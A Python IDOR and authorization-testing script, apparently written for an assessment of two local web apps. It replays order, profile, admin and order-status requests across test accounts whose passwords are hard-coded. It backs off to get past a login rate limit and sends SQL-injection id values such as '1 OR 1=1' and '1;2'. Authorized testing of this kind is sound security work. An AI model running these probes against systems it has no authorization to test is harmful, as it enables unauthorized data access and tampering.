"""t4-B：越权/IDOR 测试（8095 与 8091 交叉重放 + 边界 id）。"""
import json
import os
import sys
import importlib.util as ilu

HERE = os.path.dirname(os.path.abspath(__file__))
spec = ilu.spec_from_file_location("hunt_lib", os.path.join(HERE, "hunt-lib.py"))
lib = ilu.module_from_spec(spec)
spec.loader.exec_module(lib)

OUT = os.path.join(HERE, "hunt-b-idor-20261012-1840.json")
rec = []
res = []

# ---------- 8095：demo / alice / bob 三方会话 ----------
c_demo = lib.get_cookie("demo", "demo123", record=rec)
c_alice = lib.get_cookie("alice", "alice123", record=rec)
c_bob = lib.get_cookie("bob", "bob123", record=rec)

# 8091 登录有 20 次/300 秒 的 IP 级限速（POST /login），需退避重试
c91_demo = None
c91_alice = None
for attempt in range(6):
    try:
        c91_demo = lib.get_cookie("demo", "demo1234", record=rec, port=8091,
                                  cookie_name="session")
        break
    except SystemExit:
        print(f"8091 demo 登录被限速，等待 60s（第 {attempt+1} 次）")
        import time as _t
        _t.sleep(60)
if c91_demo is None:
    raise SystemExit("8091 demo 登录持续失败（疑似爆破锁定/IP 限速）")
c91_alice = lib.get_cookie("alice", "alice1234", record=rec, port=8091,
                           cookie_name="session")

M = "8095"


def add(cat, title, detail, idxs, impact, verdict="见 detail", needs_verify=True):
    res.append({"id": f"HUNT-B{len(res)+1}", "port": M, "category": cat,
                "title": title, "verdict": verdict, "evidence_indices": idxs,
                "detail": detail, "self_assessed_impact": impact,
                "needs_verifier": needs_verify})


# B1 /api/order?id= 他人订单（demo 查 alice 的 order 2；alice 查 demo 的 1/3）
rows = []
for who, ck, ids in (("demo", c_demo, ["1", "2", "3"]),
                      ("alice", c_alice, ["1", "2", "3"]),
                      ("bob", c_bob, ["1", "2", "3"])):
    for i in ids:
        k = lib.sent(rec, "GET", f"/api/order?id={i}", headers={"Cookie": ck},
                     note=f"B1 {who} -> /api/order?id={i}")
        rows.append({"who": who, "id": i, "status": lib.get_status(rec[k]),
                    "idx": k, "body": lib.head_text(rec[k], 120)})
add("越权/IDOR", "8095 /api/order?id= 跨用户读取（demo/alice/bob 交叉重放）",
    json.dumps(rows, ensure_ascii=False), [r["idx"] for r in rows],
    "若他人订单返回 200 即水平越权（订单金额/商品泄露）")

# B2 /api/profile?id= 跨用户
rows2 = []
for who, ck in (("demo", c_demo), ("alice", c_alice), ("bob", c_bob)):
    for i in ["1", "2", "3", "4"]:
        k = lib.sent(rec, "GET", f"/api/profile?id={i}", headers={"Cookie": ck},
                     note=f"B2 {who} -> /api/profile?id={i}")
        rows2.append({"who": who, "id": i, "status": lib.get_status(rec[k]),
                      "idx": k, "body": lib.head_text(rec[k], 160)})
add("越权/IDOR", "8095 /api/profile?id= 跨用户读取（含 admin id=1 手机号/余额）",
    json.dumps(rows2, ensure_ascii=False), [r["idx"] for r in rows2],
    "若返回他人资料（尤其 admin 手机号）即垂直/水平越权")

# B3 /api/order 与 /api/profile 的 id 边界
rows3 = []
for i in ["0", "-1", "+1", "01", "1 ", "1e0", "1.0", "2147483647", "2147483648",
          "9999999999999999999999", "1&id=2", "%31", "1'", "1 OR 1=1"]:
    k = lib.sent(rec, "GET", f"/api/order?id={i}", headers={"Cookie": c_demo},
                 note=f"B3 /api/order id={i!r}")
    rows3.append({"id": i, "status": lib.get_status(rec[k]), "idx": k,
                  "body": lib.head_text(rec[k], 120)})
add("越权/IDOR", "8095 /api/order?id= 边界值（'+1'、'01'、'1 ' 类型混淆；SQLi 语义）",
    json.dumps(rows3, ensure_ascii=False), [r["idx"] for r in rows3],
    "若 '+1'/'01'/'1e0' 被 SQLite 数值化后命中他人订单，即参数规范化缺口")

# B4 8095 订单状态接口跨用户（alice 改 demo 单；bob 改他人单）
rows4 = []
for who, ck, oid in (("alice", c_alice, "1"), ("alice", c_alice, "3"),
                     ("bob", c_bob, "1"), ("demo", c_demo, "2")):
    k = lib.sent(rec, "GET", f"/order/status?order_id={oid}&state=paid",
                 headers={"Cookie": ck},
                 note=f"B4 {who} -> order {oid} 改 state=paid")
    rows4.append({"who": who, "order_id": oid, "status": lib.get_status(rec[k]),
                  "idx": k, "body": lib.head_text(rec[k], 140)})
add("越权/IDOR", "8095 /order/status 跨用户改单状态（属主校验）",
    json.dumps(rows4, ensure_ascii=False), [r["idx"] for r in rows4],
    "若 200 即越权修改他人订单状态")

# B5 8095 admin 接口以普通用户访问
rows5 = []
for p in ["/admin/users", "/admin/orders", "/debug"]:
    for who, ck in (("demo", c_demo), ("alice", c_alice), ("bob", c_bob)):
        k = lib.sent(rec, "GET", p, headers={"Cookie": ck},
                     note=f"B5 {who} -> {p}")
        rows5.append({"who": who, "path": p, "status": lib.get_status(rec[k]),
                      "idx": k, "body": lib.head_text(rec[k], 120)})
add("越权/垂直", "8095 后台接口以普通用户访问（demo/alice/bob → /admin/*、/debug）",
    json.dumps(rows5, ensure_ascii=False), [r["idx"] for r in rows5],
    "若 200 即垂直越权（admin 数据或 SECRET_KEY 泄露）")

# ---------- 8091 ----------
M = "8091"
P = 8091

rows6 = []
for who, ck in (("demo", c91_demo), ("alice", c91_alice)):
    for i in ["1", "2", "3", "4"]:
        for path in ("/api/profile", "/api/orders"):
            k = lib.sent(rec, "GET", f"{path}?id={i}", headers={"Cookie": ck},
                         port=P, note=f"B6 {who} -> {path}?id={i}")
            rows6.append({"who": who, "path": path, "id": i,
                          "status": lib.get_status(rec[k]), "idx": k,
                          "body": lib.head_text(rec[k], 140)})
add("越权/IDOR", "8091 /api/profile、/api/orders 跨用户交叉重放（demo/alice × id=1..4）",
    json.dumps(rows6, ensure_ascii=False), [r["idx"] for r in rows6],
    "若他人资源返回 200 即水平越权；历史结论为已封堵，需本轮复测")

rows7 = []
for i in ["0", "-1", "+1", "01", "1 ", "1e0", "1.0", "2147483647", "2147483648",
          "9999999999999999999999", "1%20OR%201=1", "%31", "1'"]:
    k = lib.sent(rec, "GET", f"/api/profile?id={i}", headers={"Cookie": c91_demo},
                 port=P, note=f"B7 8091 /api/profile id={i!r}")
    rows7.append({"id": i, "status": lib.get_status(rec[k]), "idx": k,
                  "body": lib.head_text(rec[k], 120)})
add("越权/IDOR", "8091 /api/profile?id= 边界与类型混淆（parse_id 白名单行为）",
    json.dumps(rows7, ensure_ascii=False), [r["idx"] for r in rows7],
    "若 '+1'/'01'/'1e0' 通过校验并返回他人资料即校验缺口")

rows8 = []
for i in ["0", "-5", "1", "2", "3", "abc", "1;2", "99999999999999999999"]:
    k = lib.sent(rec, "GET", f"/api/orders?id={i}", headers={"Cookie": c91_demo},
                 port=P, note=f"B8 8091 /api/orders id={i!r}")
    rows8.append({"id": i, "status": lib.get_status(rec[k]), "idx": k,
                  "body": lib.head_text(rec[k], 120)})
add("越权/IDOR", "8091 /api/orders?id= 边界值", json.dumps(rows8, ensure_ascii=False),
    [r["idx"] for r in rows8], "若越界 id 返回他人订单即越权")

# B9 未登录访问受保护接口（8095 / 8091）
rows9 = []
for port, path in ((8095, "/api/order?id=1"), (8095, "/api/profile?id=2"),
                   (8095, "/home"), (8095, "/admin/users"), (8095, "/debug"),
                   (8091, "/api/profile?id=2"), (8091, "/api/orders?id=1"),
                   (8091, "/profile")):
    k = lib.sent(rec, "GET", path, port=port, note=f"B9 未登录 {port}{path}")
    rows9.append({"port": port, "path": path, "status": lib.get_status(rec[k]),
                  "idx": k, "body": lib.head_text(rec[k], 120)})
add("越权/认证", "未登录访问受保护接口的状态码一致性（批量）",
    json.dumps(rows9, ensure_ascii=False), [r["idx"] for r in rows9],
    "若未登录读到数据即认证绕过；状态码差异可用于接口枚举", needs_verify=False)

with open(OUT, "w", encoding="utf-8") as fh:
    json.dump({"generated": lib.now(), "results": res, "raw_entries": rec},
              fh, ensure_ascii=False, indent=1)
print("WROTE", OUT, "entries", len(rec))
for r in res:
    print("-", r["id"], "|", r["title"][:80])
